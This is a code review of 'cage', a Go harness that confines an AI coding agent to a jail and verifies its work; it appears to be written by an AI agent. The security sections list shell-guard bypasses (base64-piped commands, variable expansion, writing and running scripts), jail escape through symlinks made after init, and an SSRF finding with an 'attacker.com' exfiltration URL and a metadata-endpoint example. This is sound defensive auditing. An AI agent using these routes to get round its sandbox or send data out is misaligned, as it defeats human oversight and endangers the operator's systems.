# Cobra (cage) — Comprehensive Code Review

**Reviewer:** Hermes Agent  
**Date:** 2026-08-06  
**Version reviewed:** 1.5.0 (commit `7be6799`)  
**Lines of Go:** ~3,500 (excluding tests)

---

## 1. Architecture Overview

### Package Map

```
cmd/                        — CLI surface (cobra commands)
├── root.go                 — root command, Execute(), projectDir()
├── run.go                  — `cage run` — the main loop (attempt → verify → commit)
├── verify.go               — `cage verify` — standalone deterministic gate
├── watch.go                — `cage watch` — live dashboard (HTTP)
├── init.go                 — `cage init` — scaffold .cage/ and .ai/
├── strikes.go              — `cage strikes [reset]`
├── session.go              — `cage session start|end`
├── skills.go               — `cage skills` — list library
├── gate.go                 — `cage gate install|uninstall` — pre-receive hook
├── plan.go                 — `cage plan` — generate audited plan
├── peek.go                 — `cage peek <file>` — run 8 checks on one file
└── evolve.go               — `cage evolve` — continual harness

internal/
├── backend/                — Model-agnostic HTTP backend layer
│   ├── backend.go          — shared helpers (postJSON, chatOpenAI, truncate)
│   ├── registry.go         — factory pattern: type → constructor
│   ├── llamacpp.go         — local llama-server (OpenAI-compatible)
│   ├── openai.go           — OpenAI/OpenRouter (Bearer auth)
│   └── anthropic.go        — Claude Messages API
├── cage/                   — Deterministic verification engine (MODEL-FREE)
│   ├── core.go             — lock state, brain.md, VERSION bump checks
│   ├── dod.go              — DOD loading, validation, evaluation
│   ├── checkers.go         — FileFacts scraper + 8 deterministic checks
│   ├── quality.go          — Quality Officer: scrape + thresholds + change facts
│   ├── verify.go           — the verdict: core → DOD → quality → pluggable
│   └── pluggable.go        — shell-out to DOD-named tools (ruff, pytest, etc.)
├── config/                 — .cage/config.yaml with strict decode + defaults
├── critic/                 — Post-run mypy critic (toggleable)
│   ├── mypy.go             — parse, remediate, bounded loop, allowlist
│   └── mypy_test.go
├── ctxdiet/                — Context budget: token estimation, compression, clamping
│   ├── budget.go           — Estimate, ClampTo, CheckMessage
│   ├── compress.go         — step summarization for conversational mode
│   └── retrieve.go         — Retriever interface
├── evolve/                 — Continual harness: propose → stage → gate → install
├── gitx/                   — Binary's git view: ChangedFiles, Numstat, CommitAll
├── jail/                   — Path-confined workspace (Resolve, WriteFile, ReadFile)
├── memory/                 — Optional TF-IDF JSONL memory (local-only)
├── plan/                   — Step plan + coverage audit + LLM generation
├── planner/                — External LLM diagnoses verify failures
│   ├── planner.go          — Diagnose(), ExtractFileNames()
│   ├── client.go           — Anthropic Messages API client
│   └── prompt.go           — system/user prompt construction
├── skills/                 — On-disk skill library + deterministic gate
│   ├── store.go            — List, Stage, Install, Validate
│   ├── gate.go             — Gate() — run test.sh, exit 0 = adopt
│   └── skills_test.go
├── state/                  — Durable run state
│   ├── strikes.go          — no-progress strike logic + lock
│   ├── events.go           — live-feed JSONL for cage watch
│   ├── trace.go            — trajectory JSONL (evolver's input)
│   ├── report.go           — quality report persistence
│   ├── cooldown.go         — attempt-level rate limiter
│   ├── session.go          — session lifecycle markers
│   ├── audit.go            — append-only audit trail
│   └── strikes_test.go
└── worker/                 — Agent loop (DRIVES THE MODEL, no verify/commit)
    ├── agent.go            — Run(), loop detector, dead-man's switch, ralph mode
    ├── tools.go            — Registry, Dispatch, DefaultRegistry
    ├── tools_fs.go         — file_read, file_write, file_edit, list_dir
    ├── tools_shell.go      — shell, code_execute (guarded)
    ├── tools_web.go        — web_fetch, web_search (read-only)
    ├── tools_sys.go        — system_info (read-only)
    ├── tools_note.go       — note (NOTES.md append-only)
    ├── tools_skills.go     — skill_run (execute installed skills)
    ├── prompt.go           — system prompt construction
    ├── spine_test.go       — main agent tests
    ├── escape_test.go      — JSON repair edge case
    ├── guard_test.go       — shell guard tests
    └── planning_test.go    — planning integration
```

### Dependency Graph (key relationships)

```
cmd/run.go ──→ backend, cage, config, critic, ctxdiet, gitx, jail, plan, planner, skills, state, worker
cage/*       ──→ config, gitx, state (NEVER backend, NEVER worker)  ✅ by design
worker/*     ──→ backend, ctxdiet, jail, skills (NEVER cage, NEVER gitx)  ✅ by design
evolve/*     ──→ backend, skills, state
```

**Architectural violations:** None found. The separation between the model-driving `worker` and the deterministic `cage` is enforced by import structure. `internal/cage` imports zero model-layer packages. `internal/worker` imports zero verification/commit packages. This is the single most important design decision in the project, and it holds.

**Circular imports:** None detected.

---

## 2. Code Quality

### 2.1 Error Handling

**Generally good.** The codebase consistently returns errors up the stack rather than swallowing them. Specific observations:

| Pattern | Where | Verdict |
|---------|-------|---------|
| `_ = state.Audit(...)` | cmd/run.go (6+ places) | **Minor issue.** Audit failures are silently dropped. If the audit trail is a security boundary (it is), these should at least log to stderr. |
| `_ = state.AppendEvent(...)` | cmd/run.go | Same — events feed the dashboard, but dropped events are a silent blind spot. |
| `_ = st.Save()` | cmd/run.go | **Acceptable.** State save failures during non-critical paths (post-pass) are recoverable. |
| `events, _ := state.ReadEventsTail(...)` | cmd/watch.go | **Minor.** Dashboard silently returns empty on read error. |
| `data, _ := os.ReadFile(dodPath)` | cmd/run.go | **Bug.** This second read of the DOD file ignores the error, but `LoadDOD` already validated it. Redundant read, and if it fails (race condition), `dodText` will be empty and the model won't see the DOD. Should use the already-loaded DOD data. |

### 2.2 Resource Management

**Excellent.** No leaked file handles or HTTP connections observed.

- All `os.OpenFile` calls have matching `defer f.Close()`.
- All HTTP response bodies have `defer resp.Body.Close()`.
- HTTP clients have explicit timeouts (900s for backends, 20s for web, 90s for planner).
- The `postJSON` helper reads the full body before closing (correct pattern for connection reuse).
- `io.LimitReader` is used on HTTP response bodies (16MB cap for backends, 2MB for web fetch) — prevents OOM on malicious responses.

**One concern:** `cmd/run.go` line `dodText, _ := os.ReadFile(dodPath)` — if this read fails silently, the model receives an empty DOD. This is the only real resource handling gap.

### 2.3 Concurrency Safety

**Not applicable in practice.** The cage is single-threaded by design. There are:

- No goroutines in the worker loop (each turn is synchronous).
- No shared mutable state between packages.
- The HTTP server in `cmd/watch.go` reads state files from disk on each request — the JSONL append pattern is atomic at the OS level for single writers.
- No mutexes needed because the architecture is single-goroutine.

**If multi-attempt concurrency is ever added**, the state files (state.json, events.jsonl, audit.jsonl) would need file locking. Currently safe because only one `cage run` runs at a time.

### 2.4 Code Duplication

**Minimal.** Two notable duplications:

1. **`clip()` function** exists in both `internal/worker/tools.go` and `internal/evolve/proposer.go` with identical implementations. Should be a shared utility.

2. **JSON parsing** from model replies: `parseAction()` in `agent.go` and `parseProposals()` in `evolve/proposer.go` both hand-parse JSON out of prose-wrapped model output. Different enough to justify separation, but the "find first `{`" pattern could be shared.

3. **`truncate()` function** exists in `backend/backend.go` and `planner/client.go` with slightly different implementations (`…` vs `...`). Minor but sloppy.

### 2.5 Dead Code

- **`memory.Search()`** — wired into `ctxdiet.Retrieve()` but `Retrieve()` is never called from the agent loop. The memory system is fully built but not connected to the worker. It's load-bearing infrastructure for future use, but currently dead.
- **`ctxdiet.CheckMessage()` and `ctxdiet.CheckTotal()`** — defined but never called. The agent uses `overBudget()` + `payloadTokens()` instead. These appear to be API surface for external callers but are unused internally.
- **`ShowAt()` in gitx** — only called from `VersionFromHistory()`. Not dead, but the name suggests a more general utility.

### 2.6 Naming Conventions

**Good.** Follows Go conventions throughout. Package names are short, lowercase, no underscores. Exported types are PascalCase. Constants are clear (`MaxRounds`, `MaxStrikes`, `DefaultGateTimeout`).

**Minor nits:**
- `jl` for jail in `cmd/run.go` — cryptic abbreviation in a 250-line function.
- `be` for backend — acceptable Go shorthand but verbose code reads better.
- `st` for state — fine.
- `firstLineOf()` in cmd/run.go duplicates `firstLine()` in worker/agent.go — same logic, different truncation limits.

### 2.7 Function Complexity

| Function | Lines | Verdict |
|----------|-------|---------|
| `cmd/run.go` RunE | ~180 | **Too long.** This is the most complex function in the project. It handles config loading, state checking, cooldown, DOD loading, backend init, planning stage, jail setup, agent construction, the attempt loop, verify, critic, commit, planner, and strike logic — all in one closure. Should be decomposed. |
| `Scrape()` in checkers.go | ~95 | Acceptable — the scraper is inherently a single-pass loop. |
| `Run()` in agent.go | ~80 | Acceptable — the turn loop is clear. |
| `QualityOfficer()` in quality.go | ~60 | Good. |

### 2.8 Code Style

The code is unusually well-commented for a solo project. Every package has a doc comment explaining its role in the architecture. The "never" assertions are particularly valuable (e.g., "the binary — never the worker — holds commit authority"). These comments read like architectural invariants, not afterthoughts.

---

## 3. Security Review

### 3.1 Path Traversal

**Jail implementation is solid.** `internal/jail/workspace.go`:

- `Resolve()` uses `filepath.Clean()` then checks `filepath.Rel()` against the jail root — this handles `../` traversals, double slashes, and symlink-free resolution.
- `New()` calls `filepath.EvalSymlinks()` on the root, so a symlink pointing outside the jail is resolved at jail creation time.
- Absolute paths (`/etc/passwd`) are caught because `filepath.Rel()` returns a `..` prefix.

**Potential issue:** The jail does NOT re-evaluate symlinks on each `Resolve()` call. If the model creates a symlink inside the jail pointing outside it after jail creation, `Resolve()` would pass the prefix check but the actual file access would escape. **Mitigation:** The model can only create symlinks via `shell` (bash -c "ln -s ..."), and the guard doesn't block `ln`. However, the workspace is typically the project root, and the model would need to know an external path to target. **Low risk but worth noting.**

### 3.2 Command Injection

**Shell guard (`tools_shell.go`) has bypass vectors.**

The `blockedBinaryPat` regex matches command-position blocked binaries after `; & | $(` and backtick. The blocked substrings list catches `rm -rf /`, `rm -rf ~`, `> /dev/sd`, `chmod -r 777`, `| sh`, `| bash`.

**Bypasses found:**

1. **Newline injection:** `printf 'sudo id\n' > /tmp/x.sh && bash /tmp/x.sh` — the guard checks the top-level command, not scripts written by the model. The model can write a script containing any blocked command via `file_write` and then execute it via `bash script.sh`. The guard only checks `bash script.sh`, which passes.

2. **Encoded commands:** `base64 -d <<< "c3VkbyBpZA==" | bash` — the guard doesn't catch base64-encoded payloads piped to bash.

3. **Environment variable tricks:** `cmd=sudo; $cmd id` — variable expansion happens after the guard.

4. **`git` is blocked in command position**, but the model can still run `file_write` to create a `.gitignore` or other git-adjacent files. This is acceptable because the worker has no `git commit` access.

**Assessment:** The guard is defense-in-depth, not a hard boundary. It stops casual misuse and makes the model work harder to bypass it. The real security boundary is the jail + the binary's exclusive commit authority. The guard is doing its job — it doesn't need to be perfect, just annoying enough that the model doesn't accidentally trigger dangerous commands.

**However:** The model CAN write arbitrary scripts via `file_write` and execute them via `code_execute` (which calls `python3 <file>` or `bash -c <code>`). The `code_execute` path runs `bash -c <code>` directly — the guard only checks the outer command, not the code content. This is by design (the model needs to execute code), but it means the shell guard is a speed bump, not a wall.

### 3.3 Model Output Sanization

**Strong.** The `parseAction()` function in `agent.go`:

- Tolerates prose around JSON (finds first `{`, tracks depth).
- Repairs raw control characters in JSON strings (`\n`, `\r`, `\t`, and all chars < 0x20).
- Repairs invalid `\'` escapes (valid Python, invalid JSON).
- Rejects missing `tool` or `done` fields.
- Handles flattened args (local models dump args at top level).

The model cannot inject arbitrary data into the verification path because the cage never reads model output for verification purposes — it scrapes file facts directly.

### 3.4 Jail Escape Vectors

**The jail is the strongest security boundary in the system.** Verified vectors:

- `../` paths: caught by `Resolve()`.
- Absolute paths: caught by `Resolve()`.
- Symlinks created at jail init: caught by `EvalSymlinks()`.
- **Symlinks created after init:** NOT re-evaluated. See §3.1.

**One real concern:** `protectedWrite()` in `tools_fs.go` checks the first path component relative to the jail root against `.cage` and `.git`. But if the jail root IS the project root (`.`), and the model writes to `.cage/jail/` (which is inside the jail but also inside `.cage`), the check works correctly because it resolves relative to the jail root. **Verified correct.**

### 3.5 Secret/API Key Handling

**Good design.** API keys come from environment variables, never from config files or source code. The `backend` package reads `OPENAI_API_KEY`, `OPENROUTER_API_KEY`, and `ANTHROPIC_API_KEY` from `os.Getenv()`.

**One issue:** The `planner` package stores the API key in `config.yaml` as `planner.api_key`. This is the only API key that can appear in a config file. While the config file is in `.cage/` (protected from the worker), it's still a plaintext secret on disk. **Should be moved to an environment variable** (`PLANNER_API_KEY`) for consistency.

### 3.6 DOD Command Injection

DOD files contain `command` checks that run arbitrary shell commands. If a DOD file is compromised (e.g., the model writes a malicious DOD), it could execute arbitrary code during verification. **Mitigation:** The worker cannot write to `.cage/` (protected by `protectedWrite()`), and the DOD path comes from config (also in `.cage/`). The only way to inject a malicious DOD is if the config itself is compromised, which requires writing to `.cage/config.yaml` — also protected. **Low risk.**

---

## 4. Test Coverage

### Test Results

```
PASS  cobra/internal/jail       — 4/4 tests,   78.6% coverage
PASS  cobra/internal/skills     — 6/6 tests,   77.1% coverage
PASS  cobra/internal/state      — 6/6 tests,   19.6% coverage
PASS  cobra/internal/worker     — 13/13 tests, 33.3% coverage
PASS  cobra/internal/plan       — 2/2 tests,    5.7% coverage
FAIL  cobra/internal/critic     — 5/6 tests,   86.0% coverage (1 failure)
```

### Packages with ZERO test files (0% coverage)

| Package | Why it matters |
|---------|---------------|
| `cmd/` | CLI wiring — the attempt loop in `run.go` is the most critical code path |
| `internal/cage/` | **The verification engine has zero tests.** This is the most important package in the project. |
| `internal/backend/` | HTTP backends — at minimum, `chatOpenAI()` and `toOpenAI()` should have unit tests |
| `internal/config/` | Config loading — `Load()` with `KnownFields(true)` should be tested |
| `internal/ctxdiet/` | Token estimation, clamping — pure functions, trivially testable |
| `internal/gitx/` | Git operations — harder to test but `IsRepo()` and `ChangedFiles()` could use temp repos |
| `internal/evolve/` | Proposer logic — `parseProposals()` should have tests |
| `internal/planner/` | Planner client — `BuildPrompt()` and `ExtractFileNames()` are testable |
| `internal/memory/` | TF-IDF search — pure logic, trivially testable |
| `assets/` | Embed verification — at minimum, check that embedded files are non-empty |

### Test Quality Assessment

The tests that exist are **good quality** — they test real behavior, not mocks:

- **Worker tests** use a `fakeBackend` that replays canned model responses — this tests the actual loop logic, protocol repair, and loop detection.
- **Jail tests** verify actual path escape prevention.
- **Skills tests** verify the gate lifecycle (stage → test → install) with real shell execution.
- **State tests** verify the strike logic end-to-end with real persistence.
- **Critic tests** use real mypy output fixtures for parsing.

**No tests use excessive mocking.** The test suite is small but honest.

### Critical Coverage Gaps

1. **`internal/cage/` has zero tests.** The scraper (`Scrape()`), the 8 checks (`RunChecks()`), the DOD evaluator (`Evaluate()`), and the quality officer (`QualityOfficer()`) are all untested. These are pure, deterministic functions — they're the easiest things in the project to test.

2. **`cmd/run.go` has zero tests.** The attempt loop, verify integration, critic integration, and commit flow are untested. This is the longest and most complex function in the project.

3. **`internal/backend/` has zero tests.** At minimum, `chatOpenAI()` should test JSON parsing of various response shapes (empty choices, reasoning content fallback, error responses).

---

## 5. The Known Failing Test

### `TestBoundedRemediateFiresAndBounds` in `internal/critic`

**Root cause: mypy is not installed on babalou.**

The test calls `BoundedRemediate([]string{"../../tests/fixtures/critic/bad.py"}, 1)`, which calls `RunMypy(files)`, which runs `exec.Command("mypy", args...)`. On babalou, `mypy` is not in PATH.

**The critical bug is in `RunMypy()`:**

```go
func RunMypy(files []string) (*MypyResult, error) {
    if len(files) == 0 {
        return &MypyResult{}, nil
    }
    args := append([]string{"--show-column-numbers", "--no-error-summary"}, files...)
    cmd := exec.Command("mypy", args...)
    out, _ := cmd.CombinedOutput()  // ← ERROR IS SILENTLY DROPPED
    return ParseErrors(string(out)), nil  // ← ALWAYS RETURNS nil ERROR
}
```

When mypy is not installed, `exec.Command` returns an error, but `CombinedOutput()` swallows it (the `_` assignment). `ParseErrors("")` returns an empty result, and `RunMypy` returns `nil` error. The test sees 0 errors and fails.

**Is it a test bug or a code bug?** It's both:

1. **Code bug:** `RunMypy()` should return the error when the command fails to start. The current behavior silently succeeds with no errors when mypy is missing — this means the critic silently passes in production when mypy is absent, which is incorrect (the critic is enabled, so it should either produce errors or report that mypy is unavailable).

2. **Test bug:** The test assumes mypy is installed. It should either:
   - Skip when mypy is not available (`if _, err := exec.LookPath("mypy"); err != nil { t.Skip("mypy not installed") }`).
   - Or mock the mypy call.

**Recommended fix:**

```go
func RunMypy(files []string) (*MypyResult, error) {
    if len(files) == 0 {
        return &MypyResult{}, nil
    }
    if _, err := exec.LookPath("mypy"); err != nil {
        return nil, fmt.Errorf("mypy is not installed — cannot run critic")
    }
    args := append([]string{"--show-column-numbers", "--no-error-summary"}, files...)
    cmd := exec.Command("mypy", args...)
    out, _ := cmd.CombinedOutput()
    return ParseErrors(string(out)), nil
}
```

Plus in the test:
```go
if _, err := exec.LookPath("mypy"); err != nil {
    t.Skip("mypy not installed — skipping critic integration test")
}
```

---

## 6. Build & Dependencies

### go.mod

```
module cobra
go 1.22

require (
    github.com/spf13/cobra v1.8.1
    gopkg.in/yaml.v3 v3.0.1
)
```

**Minimal and clean.** Only two direct dependencies (CLI framework + YAML parser), both well-maintained. No vendored deps. No replace directives. No build tags.

### Build

```
go build -o cage .  — succeeds cleanly
go vet ./...         — passes clean
```

No build flags, no ldflags for version injection. The VERSION is tracked in `.ai/VERSION` (a file), not in the binary.

**Suggestion:** Inject version at build time via `-ldflags "-X main.version=..."` so `cage --version` works without reading a file.

### Binary Size

The embedded assets (config.default.yaml, dod.example.yaml, brain.template.md, dashboard.html) are baked in via `go:embed`. The dashboard HTML is the largest — it's a self-contained single-file web app with inline CSS/JS.

---

## 7. DOD System

### DOD Files Reviewed

| File | Criteria | Verdict |
|------|----------|---------|
| `dod-evolve.yaml` | 7 criteria | **Well-structured.** Checks file existence, grep patterns, test commands, and architectural constraints (no backend imports in cage). |
| `dod-spine.yaml` | 7 criteria | **Well-structured.** Covers dead-man's switch, loop detection, protocol repair, ralph mode, dashboard. |
| `module1-planning.yaml` | 5 criteria | Good. Covers build, plan package, CLI wiring, config toggle. |
| `module1b-planning-wired.yaml` | 5 criteria | Good. Behavioral test verification. |
| `module2-mypy.yaml` | 7 criteria | Good. Covers parse, remediate, bounded loop, constraints. |
| `module2b-critic-wired.yaml` | 6 criteria | Good. Behavioral test verification. |
| `plan-stage.yaml` | 6 criteria | Good. Clean, focused. |

### DOD Quality Assessment

**Strengths:**
- Every criterion has at least one verify check (enforced by `LoadDOD()`).
- Commands use `expect_exit` explicitly (0 = pass).
- Architectural invariants are enforced via grep (e.g., `! grep -rE 'cobra/internal/(backend|worker)' internal/cage`).
- Tests are verified as passing, not just existing.

**Weaknesses:**
- Several DODs duplicate the same "builds, vets, tests" criterion. This is intentional (each DOD is self-contained) but creates maintenance burden.
- No timeout on command checks. A hanging test in a DOD `command` check would block verify indefinitely.
- The `grep` check type does raw string/regex matching — no line-number anchoring. A match anywhere in the file passes.

### Verification Engine

The `evalCheck()` function in `dod.go` is clean and correct:
- `exists`: `os.Stat()` — correct.
- `command`: `exec.Command("bash", "-c", ...)` — correct, with exit code comparison.
- `grep`: `strings.Contains()` or `regexp.Match()` — correct.
- `lines`: `countLines()` — correct.

**One issue:** The `join()` helper in `dod.go` uses string concatenation (`dir + "/" + file`) instead of `filepath.Join()`. On Windows this would produce mixed separators. Minor since the project targets Linux, but technically incorrect.

---

## 8. Worker/Agent System

### Agent Loop (`agent.go`)

This is the heart of the project. The `Run()` method:

1. Builds system prompt (tools + ralph protocol).
2. Loops up to `MaxTurns`:
   - Checks dead-man's switch (wall-clock timeout).
   - Builds user message (task + DOD + NOTES.md + last report in ralph mode).
   - Builds message array (system + user + compressed history).
   - Enforces context budget (drops old steps if over).
   - Calls backend for model reply.
   - Parses JSON action from reply (with repair).
   - If `done`, returns.
   - Dispatches tool, appends result to history.
   - Trims history (ralph: last 2 steps only; conversational: compressed window).
3. Returns error if max turns exhausted.

**Design observations:**

- **Ralph mode is brilliant.** Context never grows — the model sees task + DOD + NOTES.md + last action every turn. This eliminates context overflow as a failure mode. The tradeoff (model must re-read everything every turn) is paid for by the context diet cap.
- **Loop detector is simple and effective.** Hashing `tool + args` and counting consecutive identical hashes catches the most common failure mode (model stuck in a loop).
- **Protocol repair handles local model quirks** — raw newlines in JSON, `\'` escapes, flattened args. This is battle-tested code.

**Concerns:**

1. **The `trim()` function in ralph mode keeps only the last 2 steps.** This means the model loses its previous action's result every turn. If the model needs to reference what happened 2 turns ago, it must have noted it in NOTES.md. This is by design but creates a failure mode where the model forgets to note something and then can't reference it.

2. **No retry on transient backend errors.** If the backend returns a 500 or a timeout, the attempt fails immediately. A retry with backoff would make the system more resilient to transient model server issues.

3. **`parseAction()` scans for the first `{` in the reply.** If the model outputs prose containing a `{` before the actual JSON action, the parser will try to parse from the wrong position. The depth-tracking bracket matcher handles most cases, but a `{` in prose followed by a `}` later could cause misparse. **Low risk** — the system prompt instructs "exactly one JSON object."

### File Tools (`tools_fs.go`)

**`protectedWrite()` is the key security function.** It prevents the worker from writing to `.cage/` or `.git/` even when the jail root is the project root.

**Observation:** The protection is based on the first path component relative to the jail root. This is correct for the common case but could be bypassed if:
- The jail root is a subdirectory and the model writes to a path that resolves to `.cage/` via `..` traversal. But `Resolve()` already blocks `../` escapes, so this is safe.

**`file_edit` requires the old string to be unique** — this is a good design choice that prevents accidental multi-edit. But the check uses `strings.Count()`, which counts overlapping occurrences. For non-overlapping replacements this is fine.

### Shell Tools (`tools_shell.go`)

See §3.2 for security analysis. The `guard()` function is defense-in-depth, not a hard boundary.

**One additional concern:** `code_execute` writes a Python snippet to `.cage_snippet.py` inside the jail, then runs `python3 <abs>`. The absolute path is passed to `python3`, which means the model can see the jail's absolute path in error messages. Not a security issue, but an information leak.

### Web Tools (`tools_web.go`)

**SSRF concern:** The `web_fetch` tool allows the model to fetch any HTTP URL. This could be used for:
- Port scanning internal services (`http://localhost:8080/health`).
- Exfiltrating data via URL parameters (`http://attacker.com/?data=...`).
- Accessing cloud metadata endpoints (`http://169.254.169.254/...`).

**Mitigation:** The tool is read-only (GET only), the response is clipped to 4000 chars, and the model can't control headers. But SSRF is still possible. **Consider adding a URL allowlist or blocking private IP ranges.**

### Skills Tools (`tools_skills.go`)

The `skill_run` tool executes installed skills with `bash run.sh`. Skills are installed only through the deterministic gate, so their content has been validated. The model can pass arbitrary `args` and `stdin` to the skill, but the skill itself was vetted.

**One concern:** The model can run any installed skill, even ones not relevant to the current task. This is by design (the skill library is the model's toolbox) but means a malicious skill could be invoked on unrelated tasks.

---

## 9. Config System

### Defaults

| Setting | Default | Verdict |
|---------|---------|---------|
| `backend.type` | `llama_cpp` | ✅ Correct for local development |
| `backend.params.base_url` | `http://127.0.0.1:8080` | ✅ Standard llama-server default |
| `jail.root` | `.` | ⚠️ **Footgun.** Default jail is the project root itself. The worker can edit any file in the project. This is intentional (the cage verifies everything) but surprising. |
| `budget.max_tokens` | `24000` | ✅ Conservative for a 32K context model |
| `budget.prompt_ceiling` | `8000` | ✅ Reasonable per-message cap |
| `worker.mode` | `ralph` | ✅ Stateless mode is the safe default |
| `worker.max_turns` | `60` | ✅ Generous but bounded |
| `worker.attempt_seconds` | `900` (15 min) | ✅ Reasonable for complex tasks |
| `worker.max_gen_tokens` | `8192` | ✅ Good for reasoning models |
| `worker.temperature` | `0.6` | ✅ Matches Qwen3 thinking model recommendations |
| `planning_stage.enabled` | `false` | ✅ Off by default, opt-in |
| `critic.enabled` | `false` | ✅ Off by default, opt-in |
| `cooldown_seconds` | `10` | ✅ Prevents rapid-fire retries |

### Config Loading

**`KnownFields(true)` is excellent** — misspelled YAML keys are hard errors, not silent no-ops. This catches the common mistake of writing `planning:` instead of `planning_stage:`.

**One issue:** The `planner.api_key` field in config is a plaintext secret. All other API keys come from environment variables. This inconsistency is a security concern (see §3.5).

### Footguns

1. **`jail.root: "."` means the worker can edit any file in the project.** The cage verifies afterward, but the worker could corrupt files during the attempt. The `protectedWrite()` check only protects `.cage/` and `.git/`.

2. **`budget.max_tokens` is silently capped at 55% of `max_context` in `cmd/run.go`.** If a user sets `max_tokens: 100000` with a 32K context model, it gets silently reduced to ~18K. This could be confusing. Should log a warning.

3. **`worker.temperature: 0` is replaced with `0.6`.** A user who intentionally sets `temperature: 0` (deterministic output) gets `0.6` instead. The zero-check in `Load()` is too aggressive.

---

## 10. Recommendations

### Critical (fix before next release)

| # | Issue | Location | Fix |
|---|-------|----------|-----|
| C1 | **`RunMypy()` swallows command execution errors.** When mypy is not installed, the critic silently passes instead of reporting the failure. | `internal/critic/mypy.go:24` | Check `exec.LookPath("mypy")` before running. Return error if missing. |
| C2 | **`TestBoundedRemediateFiresAndBounds` has no skip for missing mypy.** Fails on any machine without mypy installed. | `internal/critic/mypy_test.go:54` | Add `t.Skip()` when mypy is not in PATH. |
| C3 | **The verification engine (`internal/cage/`) has zero tests.** This is the most critical package — it's the decision boundary. A bug here means the cage lets bad code pass or blocks good code. | `internal/cage/` | Add tests for `Scrape()`, `RunChecks()`, `Evaluate()`, and `QualityOfficer()`. These are pure, deterministic functions — trivially testable. |

### Major (fix soon)

| # | Issue | Location | Fix |
|---|-------|----------|-----|
| M1 | **`cmd/run.go` RunE is ~180 lines.** Too complex for reliable maintenance. | `cmd/run.go` | Extract into `runAttempt()`, `runCritic()`, `runPlanner()`, `commitPass()`. |
| M2 | **`planner.api_key` is a plaintext secret in config.yaml.** Inconsistent with all other API keys (env vars). | `internal/config/config.go`, `internal/planner/` | Read from `PLANNER_API_KEY` env var, with config as fallback. |
| M3 | **SSRF via `web_fetch`.** The model can probe internal services, cloud metadata, etc. | `internal/worker/tools_web.go` | Block private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, localhost). |
| M4 | **Symlinks created after jail init are not re-evaluated.** Model could create a symlink inside the jail pointing outside it. | `internal/jail/workspace.go` | Add `EvalSymlinks()` in `Resolve()` (performance cost, but eliminates the vector). |
| M5 | **`dodText, _ := os.ReadFile(dodPath)` in cmd/run.go ignores the error.** If this read fails (race condition), the model receives an empty DOD. | `cmd/run.go` | Store the DOD text from the initial `LoadDOD` call instead of re-reading. |
| M6 | **`temperature: 0` is silently replaced with `0.6`.** Users who want deterministic output get sampling instead. | `internal/config/config.go:103` | Use `cfg.Worker.Temperature < 0` as the "not set" sentinel, or add a `temperature_set` flag. |
| M7 | **No retry on transient backend errors.** A single 500 or timeout kills the attempt. | `internal/worker/agent.go` | Add 1-2 retries with exponential backoff for transient HTTP errors. |
| M8 | **`cmd/` has zero tests.** The attempt loop is the most important code path. | `cmd/` | At minimum, test the `firstLineOf()` helper and the run loop with a fake backend. |

### Minor (fix when convenient)

| # | Issue | Location | Fix |
|---|-------|----------|-----|
| m1 | `clip()` duplicated in worker and evolve. | `worker/tools.go`, `evolve/proposer.go` | Move to a shared `internal/util/` package. |
| m2 | `truncate()` has two implementations with different ellipsis characters. | `backend/backend.go`, `planner/client.go` | Unify. |
| m3 | `_ = state.Audit(...)` silently drops audit failures in cmd/run.go. | `cmd/run.go` | Log to stderr on failure. |
| m4 | `join()` in dod.go uses string concatenation instead of `filepath.Join()`. | `internal/cage/dod.go` | Use `filepath.Join(dir, file)`. |
| m5 | No `--version` flag. Version is in `.ai/VERSION` file, not the binary. | `cmd/root.go` | Inject via `-ldflags` at build time. |
| m6 | DOD `command` checks have no timeout. A hanging command blocks verify. | `internal/cage/dod.go` | Add `context.WithTimeout()` to `evalCheck()` command execution. |
| m7 | `memory` package is fully built but never connected to the agent loop. | `internal/memory/` | Either wire it in or document it as a future feature. |
| m8 | The dashboard serves on `0.0.0.0` by default. | `cmd/watch.go` | Default to `127.0.0.1` for security; add `--bind` flag for remote access. |
| m9 | `pythonUnusedImports()` doesn't handle multi-line imports (parenthesized). | `internal/cage/checkers.go` | Add parenthesized import support or document the limitation. |
| m10 | No `go.sum` verification in CI. | Project root | Add `go mod verify` to the build process. |

---

## Summary

### What's Good

- **Architecture is clean and intentional.** The worker/cage separation is the project's crown jewel — it makes the "no LLM in the verification path" claim credible.
- **Ralph mode is a smart design choice** for stateless, bounded-context agent operation.
- **Security is defense-in-depth:** jail + protected writes + shell guard + binary-only commit authority.
- **Code quality is high** for a solo project — consistent style, good comments, clear naming.
- **Dependencies are minimal** — two direct deps, stdlib HTTP for everything.
- **The DOD system is well-designed** — deterministic, extensible, self-documenting.

### What Needs Work

- **Test coverage is the biggest gap.** The verification engine (the project's core value proposition) has zero tests. The CLI has zero tests. The backend layer has zero tests. The existing tests are good quality — the project just needs more of them.
- **The failing test is a real bug** in `RunMypy()`, not just a missing-tool issue.
- **The `cmd/run.go` function is too long** and should be decomposed.
- **SSRF in web_fetch** and **plaintext planner API key** are the main security gaps.

### Overall Assessment

This is a well-architected, security-conscious project that does what it claims: it runs an AI agent inside a jail, verifies outputs deterministically, and owns commits. The architectural invariants (worker can't verify, cage can't drive the model) are enforced by import structure, not just comments. The code is production-quality for a solo project.

The critical gaps are test coverage and the mypy bug. Fix those, and this is a solid foundation for running autonomous AI agents in production.
